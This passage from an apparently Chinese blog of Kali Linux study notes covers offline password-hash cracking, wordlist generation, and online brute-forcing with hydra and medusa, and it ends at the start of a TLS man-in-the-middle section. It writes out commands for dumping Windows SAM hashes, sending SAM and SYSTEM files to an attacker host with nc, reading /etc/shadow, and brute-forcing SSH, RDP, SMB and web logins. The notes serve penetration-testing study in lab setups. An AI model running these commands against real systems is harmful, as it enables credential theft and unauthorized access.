</li>
</ul>
<blockquote>
<pre><code>⭐哈希算法是单向算法，逆向碰撞在数学上是存在不可行性，只能通过碰撞去破解</code></pre></blockquote>
<ul>
<li>破解思路<ul>
<li>嗅探获取密码HASH</li>
<li>利用漏洞登陆服务器并从用户数据库获取HASH</li>
<li>识别HASH类型（长度、字符集）</li>
<li>利用离线破解工具碰撞密码HASH</li>
</ul>
</li>
<li>优势<ul>
<li>离线不会触发密码锁定机制</li>
<li>不会产生大量登陆失败日志引起管理员注意</li>
</ul>
</li>
<li>HASH识别工具<ul>
<li>hash-identifier</li>
<li>Hashid</li>
<li>▲ 可能识别错误或无法识别</li>
<li>安装浏览器插件：hashr ▲ 2020.1.25无法找到hashr插件</li>
</ul>
</li>
<li><strong><code>🔺命令：hash-identifier</code></strong><ul>
<li>直接贴入hash值</li>
</ul>
</li>
<li><strong><code>🔺命令：hashid hash值</code></strong></li>
</ul>
<h4 id="2-Windows-HASH获取–已有登陆账号（Win7）"><a href="#2-Windows-HASH获取–已有登陆账号（Win7）" class="headerlink" title="2. Windows HASH获取–已有登陆账号（Win7）"></a>2. Windows HASH获取–已有登陆账号（Win7）</h4><ul>
<li>SAM数据库，身份提权等   </li>
<li>利用漏洞：Pwdump、fgdump、 mimikatz、wce </li>
</ul>
<h4 id="3-Windows-HASH获取–未有登陆账号（Win7）"><a href="#3-Windows-HASH获取–未有登陆账号（Win7）" class="headerlink" title="3. Windows HASH获取–未有登陆账号（Win7）"></a>3. Windows HASH获取–未有登陆账号（Win7）</h4><ul>
<li>物理接触：samdump2</li>
<li>插入一张Kali ISO 启动虚拟机，用Kali启动电脑，进入Live模式</li>
<li><strong><code>🔺命令：fdisk -l</code></strong>（查看本地硬盘）</li>
<li><strong><code>🔺命令：mount /dev/sda1 /mdedia</code></strong>（小容量分区，引导文件）</li>
<li><strong><code>🔺命令：mount /dev/sda2 /mnt</code></strong>（大容量分区，操作系统文件）</li>
<li><strong><code>🔺命令：ls /mnt</code></strong>（存在windows目录）</li>
<li><strong><code>🔺命令：cd /mnt/Windows/System32/config</code></strong><ul>
<li>SYSTEM目录保存一个密钥，用于加密SAM数据库，默认不设置，设置后需输入两次密码 </li>
</ul>
</li>
<li><strong><code>🔺命令：samdump2 SYSTEM SAM -o sam.hash</code></strong><ul>
<li>Win7/Win8默认禁用Administrator/Guest账号，需要手动右键运行</li>
<li>Win7/Win8废弃LMHash，只用NTLMHash</li>
</ul>
</li>
<li>利用nc传输HASH<ul>
<li><strong><code>🔺命令：nc -nvlp 3333</code></strong>（攻击者的Kali）</li>
<li><strong><code>🔺命令：nc IP地址 3333</code></strong>（Window上的Kali）</li>
</ul>
</li>
</ul>
<h4 id="4-Hashcat"><a href="#4-Hashcat" class="headerlink" title="4. Hashcat"></a>4. Hashcat</h4><ul>
<li>开源多线程密码破解工具 </li>
<li>支持80多种加密算法破解</li>
<li>基于CPU的计算能力破解</li>
<li>支持通配符，模式（hashcat -h）</li>
<li>常用参数/命令<ul>
<li>-m（hash值的类型）<ul>
<li><strong><code>🔺命令：echo 哈希值 sam.hash</code></strong></li>
<li><strong><code>🔺命令：hashcat -m 1000 sam.hash pass.lst</code></strong>（NTLM）</li>
<li><strong><code>🔺命令：hashcat -m 100 hash.dump pass.lst</code></strong>（SHA-1）</li>
<li><strong><code>🔺命令：hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d</code></strong>（MD5）</li>
</ul>
</li>
<li>-a（选用字典的模式）</li>
<li>-b（测试当前机器CPU计算能力）</li>
<li><strong><code>🔺命令：hashcat -m 100 -a 3 hash -i --increment-min（增量） 6 --increment-max 8 ?l?l?l?l?l?l?l?l</code></strong> </li>
</ul>
</li>
<li>通配符<ul>
<li>?l = abcdefghijklmnopqrstuvwxyz </li>
<li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ </li>
<li>?d = 0123456789 </li>
<li>?s =  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ </li>
<li>?a = ?l?u?d?s </li>
<li>?b = 0x00 - 0xff</li>
</ul>
</li>
<li>六种模式 <ul>
<li>0 Straight：字典破解 </li>
<li>1 Combination：将字典中密码进行组合（1 2 &gt; 11 22 12 21） </li>
<li>2 Toggle case：尝试字典中所有密码的大小写字母组合 </li>
<li>3 Brute force：指定字符集（或全部字符集）所有组合 </li>
<li>4 Permutation：字典中密码的全部字符置换组合（12 21） </li>
<li>5 Table-lookup：程序为字典中所有密码自动生成掩码</li>
</ul>
</li>
<li>▲ 2020.1.26This device’s constant buffer size is too small/This device’s local mem size is too small猜测需要用到显卡GPU</li>
<li>▲ 2020.1.26从hashcat 3.30开始，在虚拟机中运行hashcat经常会报错，提示GPU错误。这是由于从该版本开始，hashcat对于Intel CPU会自动检测Intel OpenCL运行时，即是否支持GPU破解。如果不支持，就会停止运行。还有需要缓存足够，用户可添加隐藏选项–force来强制运行，也不一定好使。</li>
<li>▲ 2020.1.26在物理机上可以正常使用</li>
</ul>
<p><img src="/images/kali/kali-notepad/hashcat.PNG" srcset="/img/loading.gif" alt="hashcat使用"></p>
<h4 id="5-Syskey（Window的操作系统工具）"><a href="#5-Syskey（Window的操作系统工具）" class="headerlink" title="5. Syskey（Window的操作系统工具）"></a>5. Syskey（Window的操作系统工具）</h4><ul>
<li>使用Bootkey利用RC4算法加密SAM数据库<ul>
<li>Win+R → syskey</li>
<li>设置Bootkey</li>
<li>在软盘上保存启动密码/在本机上保存启动密码</li>
<li>尝试破解Bootkey加密后的密码（两次密码不对应，也难以破解）</li>
</ul>
</li>
<li>Bootkey保存于SYSTEM文件中 </li>
<li>Bkhive <ul>
<li>从SYSTEM文件中提取bootkey </li>
<li>Kali 2.0 抛弃了bkhive（工具已经长期不更新，安装过程问题也较多）</li>
<li>编译安装：<a href="http://http.us.debian.org/debian/pool/main/b/bkhive/" target="_blank" rel="noopener">http://http.us.debian.org/debian/pool/main/b/bkhive/</a><ul>
<li>下载tar.gz的源码包（bkhive_1.1.1.orig.tar.gz）</li>
<li><strong><code>🔺命令：tar -zxvf *.tar.gz</code></strong></li>
<li><strong><code>🔺命令：cd bkhive</code></strong></li>
<li><strong><code>🔺命令：make</code></strong></li>
<li><strong><code>🔺命令：make install</code></strong> </li>
<li><strong><code>🔺命令：apt-get -f install</code></strong></li>
<li><strong><code>🔺命令：apt-get purge samdump2</code></strong>（卸载高版本的samdump）</li>
<li><strong><code>🔺命令：apt-get install libssl-dev</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：nc -nvlp 333 &gt; SYSTEM</code></strong>（攻击者的Kali）</li>
<li><strong><code>🔺命令：nc IP地址 333 &lt; SYSTEM -q 1</code></strong>（Window上的Kali）</li>
<li><strong><code>🔺命令：nc -nvlp 333 &gt; SAM</code></strong>（攻击者的Kali）</li>
<li><strong><code>🔺命令：nc IP地址 333 &lt; SAM -q 1</code></strong>（Window上的Kali）</li>
<li><strong><code>🔺命令：bkhive SYSTEM key</code></strong> </li>
<li><strong><code>🔺命令：samdump2 SAM key</code></strong>（版本已更新，不再支持此功能）</li>
</ul>
</li>
<li>建议使用 Kali 1.x（Kali 1.1版本可以实现）▲ 2020.1.26暂无可靠的Kali 1.x版本</li>
</ul>
<h4 id="6-Oclhashcat"><a href="#6-Oclhashcat" class="headerlink" title="6. Oclhashcat"></a>6. Oclhashcat</h4><ul>
<li>号称世界上最快、唯一的基于GPGPU的密码破解软件 </li>
<li>免费开源、支持多平台、支持分布式、150+hash算法</li>
<li>硬件支持<ul>
<li>虚拟机中无法使用 </li>
<li>支持CUDA技术的Nvidia显卡 </li>
<li>支持OpenCL技术的AMD显卡 </li>
<li>安装相应的驱动</li>
</ul>
</li>
<li>限制<ul>
<li>最大密码长度55字符 </li>
<li>使用Unicode的最大密码长度27字符</li>
</ul>
</li>
<li>关于版本<ul>
<li>oclHashcat-plus、oclHashcat-lite已经合并为oclhashcat</li>
<li>▲ 2020.1.26 Kali机子上只有hashcat，只支持有GPU的密码破解</li>
</ul>
</li>
<li>命令<ul>
<li><strong><code>🔺命令：oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a</code></strong></li>
</ul>
</li>
<li>通配符<ul>
<li>?l = abcdefghijklmnopqrstuvwxyz </li>
<li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ </li>
<li>?d = 0123456789 </li>
<li>?s =  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ </li>
<li>?a = ?l?u?d?s </li>
<li>?b = 0x00 - 0xff</li>
</ul>
</li>
</ul>
<h4 id="7-RainbowCrack"><a href="#7-RainbowCrack" class="headerlink" title="7. RainbowCrack"></a>7. RainbowCrack</h4><ul>
<li>基于时间记忆权衡技术生成彩虹表（保存计算好的密码字典）</li>
<li>提前计算密码的HASH值，通过比对HASH值破解密码</li>
<li>计算HASH的速度很慢，修改版支持CUDA GPU <ul>
<li><a href="https://www.freerainbowtables.com/en/download/" target="_blank" rel="noopener">https://www.freerainbowtables.com/en/download/</a></li>
</ul>
</li>
<li>KALI中包含RainbiwCrack工具<ul>
<li>rtgen：预计算，生成彩虹表，耗时的阶段 </li>
<li>rtsort：对rtgen生成的彩虹表进行排序 </li>
<li>rcrack：查找彩虹表破解密码 </li>
<li>以上命令必须顺序使用</li>
</ul>
</li>
<li>彩虹表 <ul>
<li>密码明文、HASH值、HASH算法、字符集、明文长度范围 </li>
</ul>
</li>
<li>下载彩虹表<ul>
<li><a href="https://www.freerainbowtables.com/en/download/" target="_blank" rel="noopener">https://www.freerainbowtables.com/en/download/</a></li>
<li><a href="http://rainbowtables.shmoo.com/" target="_blank" rel="noopener">http://rainbowtables.shmoo.com/</a></li>
</ul>
</li>
<li>生成彩虹表–rtgen <ul>
<li>LanMan、NTLM、MD2、MD4、MD5、SHA1、RIPEMD160 </li>
<li><strong><code>🔺命令：rtgen md5 loweralpha（使用的字符集） 1（最小长度） 5（最大长度） 0（表索引） 10000 10000 0</code></strong> </li>
<li>计算彩虹表时间可能很长</li>
</ul>
</li>
<li>彩虹表排序–rtsort<ul>
<li><strong><code>🔺命令：cd /usr/share/rainbowcrack</code></strong> </li>
<li><strong><code>🔺命令：rtsort /md5_loweralpha#1-5_0_1000x1000_0.rt</code></strong></li>
</ul>
</li>
<li>密码破解–rcrack<ul>
<li><strong><code>🔺命令：rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592</code></strong> </li>
<li><strong><code>🔺命令：rcrack *.rt -l hash.txt</code></strong></li>
</ul>
</li>
<li>▲ 2020.1.26自生成的彩虹表无法被找到</li>
</ul>
<h4 id="8-John"><a href="#8-John" class="headerlink" title="8. John"></a>8. John</h4><ul>
<li>支持众多服务应用的加密破解 <ul>
<li><strong><code>🔺命令：john --list=formats</code></strong></li>
</ul>
</li>
<li>支持某些对称加密算法破解</li>
<li>模式 <ul>
<li>Wordlist：基于规则的字典破解 </li>
<li>Single crack：默认被首先执行，使用Login/GECOS信息尝试破解 </li>
<li>Incremental：所有或指定字符集的暴力破解 </li>
<li>External：需要在主配配文件中用C语言子集编程</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐hashcat不支持对称加密算法的破解/john支持单向，对称，非对称加密算法破解
⭐用户信息（GECOS信息，包括名字，电话等，在/etc/passwd中）
1./etc/passwd存放账号的信息，/etc/shadow存放账号的密码信息
2./bin/false → 不可用此账号登陆，/bin/bash → 可用此账号登陆
⭐chin（可对用户GECOS信息进行修改）</code></pre></blockquote>
<ul>
<li>默认破解模式 <ul>
<li>Single、wordlist、incremental（按顺序尝试三种模式）</li>
<li>主配置文件中指定默认wordlist</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐[Options]（/etc/john/john.conf）
#Default wordlist file name (including in batch mode)
Wordlist=$JOHN/password.lst</code></pre></blockquote>
<ul>
<li>破解Linux系统账号密码 <ul>
<li><strong><code>🔺命令：unshadow /etc/passwd /etc/shadow &gt; pass.txt</code></strong>（用户名密码文件的合并）</li>
<li><strong><code>🔺命令：john pass.txt</code></strong> </li>
<li><strong><code>🔺命令：john --show</code></strong> （密码保存在文件下）</li>
<li>(.john）john.pot–密码保存/john.log–日志文件/john.rec–破解过程信息</li>
</ul>
</li>
<li>破解windows密码 <ul>
<li><strong><code>🔺命令：john sam.hash --wordlist=password.lst --format=nt</code></strong> </li>
<li><strong><code>🔺命令：john sam.hash --format=nt --show</code></strong></li>
</ul>
</li>
<li>Johnny图形化界面的John</li>
</ul>
<h4 id="9-Ophcrack（图形化界面）"><a href="#9-Ophcrack（图形化界面）" class="headerlink" title="9. Ophcrack（图形化界面）"></a>9. Ophcrack（图形化界面）</h4><ul>
<li>基于彩虹表的LM、NTLM密码破解软件</li>
<li>需要Load一个彩虹表，安装解压后的文件（官方网站下载彩虹表）</li>
<li>彩虹表：<a href="http://ophcrack.sourceforge.net/tables.php" target="_blank" rel="noopener">http://ophcrack.sourceforge.net/tables.php</a></li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五十九)：密码破解--身份认证、字典</title>
    <url>/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81%E5%AD%97%E5%85%B8/</url>
    <content><![CDATA[<hr>
<h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1. 思路"></a>1. 思路</h4><ul>
<li>目标系统实施了强安全措施<ul>
<li>安装了所有补丁</li>
<li>无任何已知漏洞</li>
<li>无应用层漏洞</li>
<li>攻击面最小化（端口最小化，利用化）</li>
</ul>
</li>
<li>社会工程学</li>
<li>获取目标系统用户身份<ul>
<li>非授权用户不受信，认证用户可以访问守信资源</li>
<li>已有用户账号权限受限，需要提权</li>
<li>不会触发系统报警（非上传木马，用正常管理员登陆）</li>
</ul>
</li>
</ul>
<h4 id="2-身份认证方法"><a href="#2-身份认证方法" class="headerlink" title="2. 身份认证方法"></a>2. 身份认证方法</h4><ul>
<li>证明你是你声称你是的那个人<ul>
<li>你知道什么（账号密码、pin、passphrase）</li>
<li>你有什么（令牌、token、key、证书、密宝、手机）</li>
<li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别）</li>
<li>以上方法结合使用（多因素身份认证）</li>
</ul>
</li>
<li>基于互联网的身份认证仍以账号密码为主要形式</li>
</ul>
<h4 id="3-密码破解方法"><a href="#3-密码破解方法" class="headerlink" title="3. 密码破解方法"></a>3. 密码破解方法</h4><ul>
<li>人工猜解<ul>
<li>垃圾桶工程</li>
<li>被动信息收集</li>
</ul>
</li>
<li>基于字典暴力破解（主流）</li>
<li>键盘空间字符爆破</li>
<li>字典<ul>
<li>保存有用户和密码的文本文件</li>
<li>/usr/share/wordlist</li>
<li>/usr/share/wfuzz/wordlist</li>
<li>/usr/share/seclists</li>
<li>▲ rockyou.txt</li>
</ul>
</li>
</ul>
<h4 id="4-字典–Crunch"><a href="#4-字典–Crunch" class="headerlink" title="4. 字典–Crunch"></a>4. 字典–Crunch</h4><ul>
<li>键盘空间字符爆破<ul>
<li>全键盘空间字符</li>
<li>部分键盘空间字符（基于规则）</li>
<li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li>
</ul>
</li>
<li>crunch <min-len><max-len>[<charset string>][options]<ul>
<li><charset string>默认是小写字符</li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100</code></strong><ul>
<li>-b（按大小分割【kb/kib、mb/mib、gb/gib】）kb、mb、gb → 1000/kib、mib、gib → 1024</li>
<li>-c（每个字典的行数）</li>
<li>以上两个参数必须与-o START结合使用</li>
<li>-d（同一字符连贯出现数量【11/aaa】）</li>
</ul>
</li>
<li>字符集<ul>
<li><strong><code>🔺命令：cat /usr/share/crunch/charset.lst</code></strong></li>
<li><strong><code>🔺命令：crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></strong></li>
</ul>
</li>
<li>无重复字符集<ul>
<li><strong><code>🔺命令：crunch 1 1 -p（指定字符作为生成字符） 1234567890 | more</code></strong></li>
<li>必须是最后一个参数</li>
<li>最大、最小字符长度失效，但必须存在</li>
<li>与-s参数不兼容（-s指定起始字符串）</li>
<li><strong><code>🔺命令：crunch 4 4 0123456789 -s 9900</code></strong></li>
</ul>
</li>
<li>读取文件中每行内容作为基本字符生成字典<ul>
<li><strong><code>🔺命令：crunch 1 1 -q</code></strong> read（文件中每段简单设置为一个字符，然后进行拼接调换）</li>
<li>最小、最大字符长度失效，但必须存在</li>
<li>每段在生成的字典文件中，每行只出现一次（4行文件=4<em>3</em>2*1=24行字典）</li>
</ul>
</li>
<li>字典组成规则<ul>
<li><strong><code>🔺命令：crunch 6 6 -t @,%%^^ | more</code></strong></li>
<li>@：小写字母 lalpha</li>
<li>,：大写字母 ualpha</li>
<li>%：数字 numeric</li>
<li>^：符号 symbols</li>
</ul>
</li>
<li>输出文件压缩<ul>
<li><strong><code>🔺命令：crunch 4 4 -t @,%^ -o 1.txt -z 7z</code></strong></li>
<li>其他压缩格式：gzip、bzip2、lzma</li>
<li>-7z压缩比率最大</li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 4 4 -f /usr/share/crunch/charset.lsb mixalpha-numeric-all-space -o w.txt -t @d@@ -s cdab</code></strong>（@表示字符集所有组合，特殊情况）</li>
<li><strong><code>🔺命令：crunch 4 5 -p dog cat bird</code></strong>（后面三个词语是为三个基本字符）</li>
<li><strong><code>🔺命令：crunch 5 5 abc DEF + \!@# -t ,@^%,</code></strong> （从指定的字符中挑选）<ul>
<li><ul>
<li>占位符（表示所有）</li>
</ul>
</li>
<li>\ 转义符（空格、符号）</li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 5 5 -t ddd%% -p dog cat bird</code></strong><ul>
<li>任何不同于-p 参数指定的值都是占位符</li>
<li>d无效，不同于-p </li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 5 5 -d 2@ -t @@@%%</code></strong>（小写字母不能超过两个连续相同）</li>
<li>组合应用（边生成边使用边丢弃）<ul>
<li><strong><code>🔺命令：crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –</code></strong></li>
<li><strong><code>🔺命令：crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd -</code></strong></li>
</ul>
</li>
</ul>
<h4 id="5-字典–CUPP"><a href="#5-字典–CUPP" class="headerlink" title="5. 字典–CUPP"></a>5. 字典–CUPP</h4><ul>
<li>按个人信息生成其专属的密码字典（适合破解个人信息的个人账号密码）</li>
<li>CUPP：Common User Password Profiler<ul>
<li><strong><code>🔺命令：git clone https://github.com/Mebus.cupp.git</code></strong></li>
<li><strong><code>🔺命令：python cupp.py -i</code></strong></li>
</ul>
</li>
</ul>
<h4 id="6-字典–cewl"><a href="#6-字典–cewl" class="headerlink" title="6. 字典–cewl"></a>6. 字典–cewl</h4><ul>
<li>通过收集网站信息生成字典</li>
<li><strong><code>🔺命令：cewl 1.1.1.1（或域名） -m 3 -d 3 -e -c -v -w a.txt</code></strong><ul>
<li>-m（最小单词长度）</li>
<li>-d（爬网深度）</li>
<li>-e（收集包含email地址信息）</li>
<li>-c（每个单词出现次数）</li>
<li>支持基本、摘要身份认证</li>
<li>支持代理</li>
</ul>
</li>
<li>用户密码变型<ul>
<li>基于cewl得结果进行密码变型</li>
<li>末尾增加数字串</li>
<li>字母大小写变化</li>
<li>字母与符号相互转换</li>
<li>字母与数字相互转换</li>
<li>P@$$w0ord</li>
</ul>
</li>
</ul>
<h4 id="7-字典–John-the-Ripper"><a href="#7-字典–John-the-Ripper" class="headerlink" title="7. 字典–John the Ripper"></a>7. 字典–John the Ripper</h4><ul>
<li>使用John the Ripper配置文件实现密码动态变型</li>
<li>/etc/john/john.conf<ul>
<li>[List.Rules:Wordlist]</li>
<li>$[0-9]$[0-9]$[0-9]</li>
<li><strong><code>🔺命令：cat a.txt | head -n 10 | cut -d &quot;,&quot; -f 1 &gt;  p.lst</code></strong>（a.txt为cewl生成的文件）</li>
<li><strong><code>🔺命令：john --wordlist=p.lst --rules --stdout &gt; m.txt</code></strong></li>
<li><strong><code>🔺命令：wc -l m.txt</code></strong>（查看m.txt里面有多少条记录）<br>– [List.Rules:test] $[0-9]$[0-9]$[0-9]$[a-zA-Z] $[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[<code>~!@#$%^&amp;*()\-_=+]
– **</code>🔺命令：john –wordlist=cewl.txt –rules=test –stdout &gt; m.txt<code>**
– **</code>🔺命令：john –wordlist=ahm.lst –rules=test HASHFILE`**</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六十)：在线密码破解</title>
    <url>/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<hr>
<h4 id="1-hydra（稳定性可能较差）"><a href="#1-hydra（稳定性可能较差）" class="headerlink" title="1. hydra（稳定性可能较差）"></a>1. hydra（稳定性可能较差）</h4><ul>
<li>在线密码破解–对在线服务的密码破解</li>
<li>离线密码破解–非在线服务的密码破解</li>
<li>Hydra<ul>
<li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li>
<li>-vV（查看详细信息）</li>
<li>-t（并发连接数）</li>
<li>-e nsr（’n’ → 空字符，’s’ → 账号和密码相同，’r’ → ‘调换账号和密码’）</li>
<li>-s（非默认输入端口）</li>
<li>-L（自定义密码文件）</li>
<li>-P（系统密码文件）</li>
</ul>
</li>
<li>Windows密码破解<ul>
<li>window2003设置密码，开启远程桌面（net share查看共享文件）</li>
<li><strong><code>🔺命令：hydra -l administartor -P pass.lst smb://1.1.1.1 -vV</code></strong></li>
<li><strong><code>🔺命令：hydra -l administartor -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></strong></li>
</ul>
</li>
<li>Linux密码破解<ul>
<li>设置Metasploitable的root登陆密码（sudo passwd root）</li>
<li><strong><code>🔺命令：hydra -l root -P pass.lst ssh://1.1.1.1 -vV</code></strong></li>
<li>▲ 日志服务器的报警</li>
</ul>
</li>
<li>其他服务密码破解<ul>
<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址</code></strong>（是否开启）</li>
<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址 -sV</code></strong>（开启的服务）</li>
<li><strong><code>🔺命令：hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></strong></li>
</ul>
</li>
<li>图形化界面<ul>
<li><strong><code>🔺命令：xhydra</code></strong>（旧版本为hydra-gtk）</li>
<li><strong><code>🔺命令：ftp 1.1.1.1</code></strong>（Metasploitable的21端口ftp服务配置错误，只要用户名正确，无密码）</li>
</ul>
</li>
<li>HTTP表单身份认证<ul>
<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot; -V</code></strong> </li>
<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed&quot; -V</code></strong></li>
<li>特征字符非Login Failed，为index.php，特征字符可以位于header中，也可以位于body</li>
<li>/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:Foo<ul>
<li>C：先访问指定页面取得cookie </li>
<li>H：指定http头</li>
</ul>
</li>
<li>https-post-form、https-get-form、https-get-form</li>
<li>-S:使用SSL连接</li>
</ul>
</li>
</ul>
<h4 id="2-pw-inspector"><a href="#2-pw-inspector" class="headerlink" title="2. pw-inspector"></a>2. pw-inspector</h4><ul>
<li>pw-inspector<ul>
<li>按长度和字符集筛选字典</li>
<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l</code></strong>（小写字母筛选）</li>
<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></strong>（大写字母筛选）</li>
<li>-m（最小位数）</li>
<li>-M（最大位数）</li>
</ul>
</li>
<li>密码破解效率<ul>
<li>密码复杂度（字典命中率）</li>
<li>带宽、协议、服务器性能、客户端性能</li>
<li>锁定阈值</li>
<li>单位时间最大登陆请求次数</li>
</ul>
</li>
</ul>
<h4 id="3-medusa"><a href="#3-medusa" class="headerlink" title="3. medusa"></a>3. medusa</h4><ul>
<li>Hydra的缺点<ul>
<li>稳定性差，程序时常崩溃</li>
<li>速度控制不好，容易触发服务屏蔽或锁死机制</li>
<li>每主机新建过程，每服务新建实例</li>
<li>大量目标破解时性能差</li>
<li>▲ 对CPU以及存储空间占用较大</li>
</ul>
</li>
<li>Medusa的特点<ul>
<li>稳定性好（单主机、多主机）</li>
<li>速度控制得当</li>
<li>基于线程</li>
<li>支持模块少于hydra（不支持RDP）</li>
<li>WEB-Form支持存在缺陷（只支持失败获得的信息，且只支持200响应代码的页面）</li>
</ul>
</li>
<li>常用参数<ul>
<li><strong><code>🔺命令：mdeusa -d</code></strong>（查看支持的模块）</li>
<li><strong><code>🔺命令：medusa -M</code></strong>（选择的模块）</li>
<li><strong><code>🔺命令：medusa -M 模块 -q</code></strong>（查看模块详细参数）</li>
<li>-m（大模块相应的参数）    </li>
<li>-h IP地址（选择的主机）-u 用户（指定用户）、-P 密码（指定密码文件）</li>
<li>-e（n/s/ns）（同hydra，但缺少参数r）</li>
<li>-F（获取一个即停止）</li>
<li>-T 数字（并发主机数）</li>
<li>-v 数字（显示破解过程的详细信息程度）</li>
<li>-n 端口（使用端口）</li>
<li>-s （使用SSL连接）</li>
</ul>
</li>
<li>破解Windows密码<ul>
<li><strong><code>🔺命令：net user administrator zipper</code></strong></li>
<li><strong><code>🔺命令：medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></strong></li>
</ul>
</li>
<li>破解Linux SSH密码（Metasploit）<ul>
<li><strong><code>🔺命令：cat /usr/share/wordlists/nmap.lst | grep -v \# &gt; pass.lst</code></strong></li>
<li><strong><code>🔺命令：medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></strong></li>
</ul>
</li>
<li>其他服务密码破解<ul>
<li><strong><code>🔺命令：medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F</code></strong></li>
<li><strong><code>🔺命令：medusa -M ftp -h 1.1.1.1 -u ftp -P pass.lst -e ns -F</code></strong></li>
<li><strong><code>🔺命令：medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;</code></strong> ▲ 2020.1.25实验无法破解密码</li>
</ul>
</li>
</ul>
<h4 id="4-在线密码破解"><a href="#4-在线密码破解" class="headerlink" title="4. 在线密码破解"></a>4. 在线密码破解</h4><ul>
<li>网站的在线密码破解</li>
<li>MD5：<a href="https://cmd5.com/" target="_blank" rel="noopener">https://cmd5.com/</a></li>
<li>多种Hash值：<a href="https://1024tools.com/hash" target="_blank" rel="noopener">https://1024tools.com/hash</a></li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书</title>
    <url>/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/</url>
    <content><![CDATA[<hr>
<h4 id="1-中间人攻击"><a href="#1-中间人攻击" class="headerlink" title="1. 中间人攻击"></a>1. 中间人攻击</h4><ul>
<li>攻击者位于客户端和服务器通信链路中<ul>
<li>ARP（欺骗局域网内所有主机，误认中间人为网关）</li>
<li>DHCP（若中间人物理连接距离小于DHCP服务器，中间人可开放DHCP服务）</li>
<li>修改网关（理论上可行，实际上几乎不存在）</li>
<li>修改DNS（设置DNS解析到中间人的服务上）</li>
<li>修改HOSTS（本地域名解析文件，优先级高于网卡的DNS服务器）</li>
<li>ICMP、STP、OSPF（ICMP的重定向、STP生成树协议、OSPF路由协议）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐STP:生成树协议
1.多个核心层交换机的多线连接，容易形成环路
2.多个核心层交换机的冗杂备份
▲ 交换机物理上的环路，通过生成树协议控制，实现逻辑上的无环路</code></pre></blockquote>
<p><img src="/images/kali/kali-notepad/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.PNG" srcset="/img/loading.gif" alt="中间人攻击"></p>
<ul>
<li>加密流量</li>
<li>攻击的前提<ul>
<li>客户端已经信任伪造证书颁发机构</li>
<li>攻击者控制了核发证书颁发机构</li>
<li>客户端程序禁止了显示证书错误告警信息</li>
<li>攻击者已经控制客户端，并强制其信任伪造证书</li>
</ul>
</li>
<li>▲ ARP地址欺骗是实现中间人攻击的因素之一</li>
</ul>
